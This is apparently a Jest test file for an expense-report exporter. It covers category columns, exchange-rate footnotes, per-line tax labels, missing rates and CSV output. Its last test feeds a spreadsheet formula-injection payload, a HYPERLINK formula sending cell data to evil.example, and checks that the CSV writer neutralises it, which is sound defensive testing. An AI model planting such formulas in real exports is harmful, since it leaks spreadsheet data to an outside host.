const doc = require('./expense-doc');

const payload = {
  company: { name: 'Solv Pte Ltd', baseCurrency: 'SGD', timezone: 'Asia/Singapore', fxPolicy: 'receipt_date', reportColumns: ['Air & Transport', 'Lodging', 'Meals', 'Entertainment', 'Phone', 'Fuel/Mileage', 'Other'] },
  report: { number: 'EXP-2026-0007', kind: 'trip', title: 'India trip', purpose: 'Client site visits, India', periodFrom: '2026-08-31', periodTo: '2026-09-04', destination: 'Mumbai and Pune, India', nights: 4,
            status: 'claimed', claimedAt: '2026-09-10T06:02:00Z', advances: 0, notes: null },
  owner: { name: 'Aisha Mei Ling Rahman', employeeId: 'S0001', department: 'Sales', email: 'aisha@solv.sg' },
  lines: [
    { ref: 'R1', date: '2026-09-01', merchant: 'JW Marriott Mumbai Sahar', purpose: 'Client visit', description: 'Rooms', category: 'Lodging', currency: 'INR', amount: 20738.5, fxRate: 0.01341, fxRateDate: '2026-09-01', fxSource: 'frankfurter', fxFetchedAt: '2026-09-18T03:58:00Z', baseAmount: 278.1, onBehalfOf: null, tax: 3379.5 },
    { ref: 'R1', date: '2026-09-01', merchant: 'JW Marriott Mumbai Sahar', purpose: 'Client visit', description: 'Rooms', category: 'Lodging', currency: 'INR', amount: 20737.5, fxRate: 0.01341, fxRateDate: '2026-09-01', fxSource: 'frankfurter', fxFetchedAt: '2026-09-18T03:58:00Z', baseAmount: 278.09, onBehalfOf: 'Lim Wei Jie', tax: null },
    { ref: 'R2', date: '2026-09-04', merchant: 'Courtyard By Marriott Pune Chakan', purpose: null, description: 'MoMo Cafe', category: 'Meals', currency: 'INR', amount: 6426.57, fxRate: 0.0135, fxRateDate: '2026-09-04', fxSource: 'manual', fxOverrideBy: 'aisha@solv.sg', fxOverrideReason: 'card statement', fxFetchedAt: 'x', baseAmount: 86.76, onBehalfOf: null, tax: null },
    { ref: 'R3', date: '2026-09-02', merchant: 'Grab', purpose: null, description: 'Airport', category: 'Software/Utilities', currency: 'SGD', amount: 18.4, fxRate: 1, fxRateDate: '2026-09-02', fxSource: 'base', fxFetchedAt: 'x', baseAmount: 18.4, onBehalfOf: null, tax: 0 },
  ],
  receipts: [{ ref: 'R1', title: 'JW Marriott Mumbai Sahar', pages: [] }, { ref: 'R2', title: 'Courtyard Pune', pages: [] }, { ref: 'R3', title: 'Grab', pages: [] }],
  generatedAt: '2026-09-18T04:00:00Z',
};

describe('reports/expense-doc', () => {
  test("columns are the company's, collapsed to those used plus Other for a category outside the list", () => {
    const m = doc.buildModel(payload);
    expect(m.columns).toEqual(['Lodging', 'Meals', 'Other']);
    expect(m.rows).toHaveLength(4);
    expect(m.rows[0].cells).toEqual({ Lodging: 278.1 });
    expect(m.rows[3].cells).toEqual({ Other: 18.4 });
    expect(m.categoryTotals).toEqual({ Lodging: 556.19, Meals: 86.76, Other: 18.4 });
    expect(m.total).toBe(661.35);
    expect(m.reimbursement).toBe(661.35);
    expect(m.rows[1].description).toMatch(/‡$/);
  });

  test('the rate footnote names each (currency, date, source) once, lists manual rates with who and why, and states the rounding rule', () => {
    const m = doc.buildModel(payload);
    expect(m.rateNotes).toHaveLength(2);
    expect(m.rateNotes[0]).toMatch(/INR→SGD 0\.01341, European Central Bank reference rate for 1 Sep 2026, via Frankfurter, fetched 18 Sep 2026/);
    expect(m.rateNotes[1]).toMatch(/INR→SGD 0\.0135 entered by aisha@solv\.sg on 4 Sep 2026: card statement/);
    expect(m.notes.join(' ')).toMatch(/rounded to the cent/);
    expect(m.notes.join(' ')).toMatch(/Lim Wei Jie/);
    // Each line names its own tax now; a note calling every foreign tax "GST/VAT" is gone.
    expect(m.notes.join(' ')).not.toMatch(/foreign tax/i);
  });

  test('the CSV has one row per line with the base amount, and the workbook model has four sheets', () => {
    const csv = doc.expenseReportCsv(payload);
    expect(csv.split('\n')[0]).toBe('Report,Line,Date,Merchant,Description,Purpose,On behalf of,Category,Currency,Amount,Tax as printed,Tax,Rate,Rate date,Rate source,Tax (SGD),SGD,Receipt');
    expect(csv.split('\n')).toHaveLength(5);
    // A line from before receipts were kept as printed has its share of the tax and no rate.
    expect(csv).toContain('EXP-2026-0007,1,2026-09-01,JW Marriott Mumbai Sahar,Rooms,Client visit,,Lodging,INR,20738.50,Tax (rate not kept),3379.50,0.01341,2026-09-01,frankfurter,,278.10,R1');
    expect(csv).toContain(',Software/Utilities,SGD,18.40,,,1,2026-09-02,base,,18.40,R3');
    expect(doc.workbookModel(payload).sheets.map(s => s.name)).toEqual(['Cover', 'Lines', 'Rates', 'Receipts']);
    expect(doc.exportFilename(payload)).toBe('EXP-2026-0007_Aisha-Mei-Ling-Rahman');
  });

  test('each line says its tax as printed, in its own currency and the base; several taxes are joined', () => {
    const p = { ...payload, lines: [
      { ref: 'R1', date: '2026-10-12', merchant: 'Hotel Stripes Kuala Lumpur', category: 'Lodging', currency: 'MYR', amount: 342.64, fxRate: 0.3049, fxRateDate: '2026-10-12', fxSource: 'frankfurter', baseAmount: 104.47,
        taxes: [{ label: 'Service Tax', rate: 8, amount: 24.64, included: false, gross: 332.64, baseAmount: 7.51 }], tax: 24.64, baseTax: 7.51 },
      { ref: 'R2', date: '2026-10-13', merchant: 'JW Marriott Mumbai', category: 'Lodging', currency: 'INR', amount: 22420, fxRate: 0.01541, fxRateDate: '2026-10-13', fxSource: 'frankfurter', baseAmount: 345.49,
        taxes: [{ label: 'CGST', rate: 9, amount: 1710, gross: 22420, baseAmount: 26.35 }, { label: 'SGST', rate: 9, amount: 1710, gross: 22420, baseAmount: 26.35 }], tax: 3420, baseTax: 52.7 },
      { ref: 'R3', date: '2026-10-14', merchant: 'Grab', category: 'Air & Transport', currency: 'MYR', amount: 25, fxRate: 0.3049, fxRateDate: '2026-10-14', fxSource: 'frankfurter', baseAmount: 7.62, taxes: [], tax: 0, baseTax: 0 },
    ] };
    const rows = doc.expenseReportCsv(p).split('\n');
    expect(rows[1]).toContain(',MYR,342.64,Service Tax 8%,24.64,0.3049,2026-10-12,frankfurter,7.51,104.47,R1');
    expect(rows[2]).toContain(',INR,22420.00,CGST 9% + SGST 9%,3420.00,0.01541,2026-10-13,frankfurter,52.70,345.49,R2');
    // No tax printed is a blank, not a tax of 0.00.
    expect(rows[3]).toContain(',MYR,25.00,,,0.3049,2026-10-14,frankfurter,,7.62,R3');
    const lines = doc.workbookModel(p).sheets.find(s => s.name === 'Lines');
    expect(lines.header.slice(8, 17)).toEqual(['Amount', 'Tax as printed', 'Tax', 'Rate', 'Rate date', 'Rate source', 'Tax (SGD)', 'SGD', 'Receipt']);
    expect(lines.rows[1].slice(8, 16)).toEqual([22420, 'CGST 9% + SGST 9%', 3420, 0.01541, '2026-10-13', 'frankfurter', 52.7, 345.49]);
    expect(lines.money).toEqual([9, 11, 15, 16]);
    expect(doc.buildModel(p).notes.join(' ')).not.toMatch(/GST\/VAT/);
  });

  test('a tax is said by the name and rate its receipt printed', () => {
    expect(doc.taxName({ label: 'SST', rate: 6 })).toBe('SST 6%');
    expect(doc.taxName({ label: 'MwSt', rate: 19.0 })).toBe('MwSt 19%');
    expect(doc.taxName({ label: 'VAT', rate: null })).toBe('VAT');
    expect(doc.taxSaid({ label: 'SST', rate: 6, amount: 1.58 }, 'MYR')).toBe('incl. SST 6% · MYR 1.58');
    expect(doc.taxSaid({ label: 'GST', rate: 9, amount: 1.8, included: true, worked: true }, 'SGD')).toBe('incl. GST 9% · SGD 1.80, worked out');
    expect(doc.taxSaid(null, 'SGD', 1.52)).toBe('incl. tax · SGD 1.52');
  });

});

// A cell that starts with = + - @ is a formula to Excel, quoted or not, and
// merchants and purposes come from receipts and from people.
describe('reports/expense-doc — missing rates', () => {
  test('a line without a rate is left out of the totals, and the notes say so', () => {
    const p = { ...payload, lines: [...payload.lines, { ref: 'R4', date: '2026-09-03', merchant: 'Pending', category: 'Meals', currency: 'VND', amount: 500000, fxRate: null, baseAmount: null }] };
    const m = doc.buildModel(p);
    expect(m.notes.join(' ')).toMatch(/1 line has no exchange rate yet/);
    expect(m.total).toBe(doc.buildModel(payload).total);
  });
});

describe('reports/expense-doc — CSV formula injection', () => {
  test('text that would be a formula is neutralised; numbers keep their sign', () => {
    const evil = { ...payload, lines: [{ ...payload.lines[3], merchant: '=HYPERLINK("https://evil.example/?x="&A1,"Click")', purpose: '@SUM(1+1)', description: '-cmd' }] };
    const csv = doc.expenseReportCsv(evil);
    const row = csv.split('\n')[1];
    expect(row).toContain(`"'=HYPERLINK(""https://evil.example/?x=""&A1,""Click"")"`);
    expect(row).toContain("'@SUM(1+1)");
    expect(row).toContain("'-cmd");
    expect(row).not.toMatch(/,=|,"=/);
    expect(row).toContain(',18.40,');
  });
});
